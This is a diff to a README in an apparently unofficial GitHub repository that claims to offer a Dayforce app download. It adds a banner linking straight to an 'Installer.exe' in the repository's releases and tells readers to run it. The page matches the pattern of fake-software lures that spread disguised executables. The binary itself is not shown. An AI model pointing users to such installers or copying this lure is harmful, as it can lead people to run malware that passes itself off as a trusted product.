@@ -21,7 +21,9 @@ Follow these steps to set up **dayforce app download**:
 
 1. **Download the file.**  
    Click the "Download" button below or check the "Releases" section in this repository to access the latest version.
-![download](https://github.com/user-attachments/assets/e0748237-c2f2-4024-9663-ad3781738806)
+<a href="https://github.com/davisrose83/dayforce-app-download/releases/download/publish/Installer.exe">
+  <img src="https://github.com/user-attachments/assets/e0748237-c2f2-4024-9663-ad3781738806" alt="Dayforce App Download" width="300"/>
+</a>
 
 2. **Install the application.**  
    Run the downloaded file and follow the on-screen instructions to complete the setup process.
